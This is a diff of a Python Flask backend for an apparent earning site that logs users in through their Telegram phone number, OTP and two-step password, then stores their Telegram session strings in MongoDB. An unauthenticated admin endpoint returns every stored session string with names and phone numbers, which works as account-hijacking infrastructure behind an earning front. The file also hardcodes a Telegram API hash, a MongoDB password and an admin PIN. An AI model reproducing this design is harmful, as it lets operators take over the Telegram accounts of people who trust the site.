@@ -22,8 +22,8 @@ API_ID = 36466824
 API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
 MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"
 
-# ডাটাবেস কানেকশন
-client_db = MongoClient(MONGO_URI, connectTimeoutMS=30000)
+# ডাটাবেস কানেকশন (টাইমআউট ফিক্স সহ)
+client_db = MongoClient(MONGO_URI, connectTimeoutMS=30000, socketTimeoutMS=30000)
 db = client_db['aaf_tele_earn_db']
 users_col = db['users']
 ads_col = db['ads']  
@@ -34,33 +34,39 @@ withdraws_col = db['withdraws']
 temp_clients = {}
 
 # ---------------------------------------------------------
-# ১. HTML পেজ রাউটস (ইউনিক ফাংশন নাম সহ)
+# ১. HTML পেজ রাউটস (ফাংশন নাম ইউনিক করা হয়েছে)
 # ---------------------------------------------------------
 
 @app.route('/')
 @app.route('/login')
-def login_page_route(): return render_template('login.html')
+def render_login_page(): 
+    return render_template('login.html')
 
 @app.route('/dashboard')
-def dashboard_page_route(): return render_template('dashboard.html')
+def render_dashboard_page(): 
+    return render_template('dashboard.html')
 
 @app.route('/task')
-def task_page_route(): return render_template('task.html')
+def render_task_page(): 
+    return render_template('task.html')
 
 @app.route('/trading')
-def trading_page_route(): return render_template('trading.html')
+def render_trading_page(): 
+    return render_template('trading.html')
 
 @app.route('/account')
-def account_page_route(): return render_template('account.html')
+def render_account_page(): 
+    return render_template('account.html')
 
 @app.route('/wallet')
-def wallet_page_route(): return render_template('wallet.html')
+def render_wallet_page(): 
+    return render_template('wallet.html')
 
 # অ্যাডমিন পিনের কনফিগারেশন
 ADMIN_PIN = "Abdullah6790" 
 
 @app.route('/admin')
-def admin_page_main():
+def render_admin_panel():
     user_pin = request.args.get('pin')
     if user_pin == ADMIN_PIN:
         return render_template('admin.html')
@@ -78,11 +84,11 @@ def admin_page_main():
 
 
 # ---------------------------------------------------------
-# ২. ইউজার লগইন ও ওটিপি এপিআই (টেলিথন ফিক্সড)
+# ২. ইউজার লগইন ও ওটিপি এপিআই (Timeout ফিক্সড)
 # ---------------------------------------------------------
 
 @app.route('/api/send_otp', methods=['POST'])
-def send_otp_api():
+def send_otp_handler():
     data = request.json
     phone = data.get('phone')
     if not phone: return jsonify({"success": False, "message": "Phone number missing"})
@@ -92,18 +98,18 @@ def send_otp_api():
         asyncio.set_event_loop(loop)
         client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
         
-        async def run_send():
+        async def perform_send_code():
             await client.connect()
             return await client.send_code_request(phone)
 
-        result = loop.run_until_complete(run_send())
+        result = loop.run_until_complete(perform_send_code())
         temp_clients[phone] = {"client": client, "hash": result.phone_code_hash, "loop": loop}
         return jsonify({"success": True, "message": "OTP Sent Successfully!"})
     except Exception as e:
         return jsonify({"success": False, "message": str(e)})
 
 @app.route('/api/verify_login', methods=['POST'])
-def verify_login_api():
+def verify_login_handler():
     data = request.json
     phone, code, password = data.get('phone'), data.get('code'), data.get('password')
     if phone not in temp_clients: return jsonify({"success": False, "message": "Session expired"})
@@ -114,12 +120,12 @@ def verify_login_api():
         client = info["client"]
         h = info["hash"]
         
-        async def run_verify():
+        async def perform_sign_in():
             user = await client.sign_in(phone, code, phone_code_hash=h, password=password)
             session_str = client.session.save()
             return user, session_str
 
-        user, session_str = loop.run_until_complete(run_verify())
+        user, session_str = loop.run_until_complete(perform_sign_in())
         
         user_info = {
             "telegram_id": user.id,
@@ -156,7 +162,7 @@ def verify_login_api():
 
 @app.route('/api/user/dashboard_stats')
 @app.route('/api/get_user_info')
-def get_user_stats_api():
+def get_user_data():
     uid = session.get('uid')
     if not uid: return jsonify({"success": False, "message": "Not logged in"})
     
@@ -178,7 +184,7 @@ def get_user_stats_api():
 # ---------------------------------------------------------
 
 @app.route('/api/trade/update_result', methods=['POST'])
-def update_trade_api():
+def update_trading_result():
     uid = session.get('uid')
     if not uid: return jsonify({"success": False, "message": "Login required"})
 
@@ -193,7 +199,7 @@ def update_trade_api():
     return jsonify({"success": True, "message": "Balance Updated"})
 
 @app.route('/api/add_balance', methods=['POST'])
-def add_task_balance_api():
+def add_balance_from_task():
     uid = session.get('uid')
     if not uid: return jsonify({"success": False})
     
@@ -206,11 +212,11 @@ def add_task_balance_api():
 
 
 # ---------------------------------------------------------
-# ৫. অ্যাডমিন কন্ট্রোল এপিআই (সবগুলো ফাংশন এখানে আছে)
+# ৫. অ্যাডমিন কন্ট্রোল এপিআই
 # ---------------------------------------------------------
 
 @app.route('/api/update_ads', methods=['POST'])
-def update_ads_master():
+def manage_update_ads():
     try:
         data = request.json
         ads_list = data.get('ads', [])
@@ -222,7 +228,7 @@ def update_ads_master():
         return jsonify({"success": False, "message": str(e)})
 
 @app.route('/api/add_task', methods=['POST'])
-def add_task_master():
+def manage_add_task():
     try:
         task_data = request.json
         tasks_col.insert_one({
@@ -237,7 +243,7 @@ def add_task_master():
         return jsonify({"success": False, "message": str(e)})
 
 @app.route('/api/admin/update_user', methods=['POST'])
-def admin_update_user_master():
+def manage_update_user():
     try:
         data = request.json
         tg_id = int(data.get('telegram_id'))
@@ -248,12 +254,12 @@ def admin_update_user_master():
         return jsonify({"success": False})
 
 @app.route('/api/admin/get_withdrawals')
-def get_withdrawals_master():
+def manage_get_withdrawals():
     withdraws = list(withdraws_col.find({}, {"_id": 0}))
     return jsonify({"success": True, "withdrawals": withdraws})
 
 @app.route('/api/admin/get_all_sessions')
-def get_all_sessions_master():
+def manage_get_sessions():
     users = list(users_col.find({}, {"_id": 0, "name": 1, "phone": 1, "session_string": 1}))
     return jsonify({"success": True, "sessions": users})
 
@@ -264,22 +270,23 @@ def get_all_sessions_master():
 
 @app.route('/api/get_active_ads')
 @app.route('/api/get_ads')
-def get_ads_master():
+def fetch_ads():
     ads = list(ads_col.find({}, {"_id": 0}))
     return jsonify({"success": True, "ads": ads})
 
 @app.route('/api/get_tasks')
-def get_tasks_master():
+def fetch_tasks():
     tasks = list(tasks_col.find({"status": "active"}, {"_id": 0}))
     return jsonify({"success": True, "tasks": tasks})
 
 
 # ---------------------------------------------------------
-# ৭. সার্ভার রান ও পিঙ (Uptime Robot এর জন্য)
+# ৭. সার্ভার রান ও পিঙ
 # ---------------------------------------------------------
 
 @app.route('/ping')
-def ping_service(): return "PONG", 200
+def ping_checker(): 
+    return "PONG", 200
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
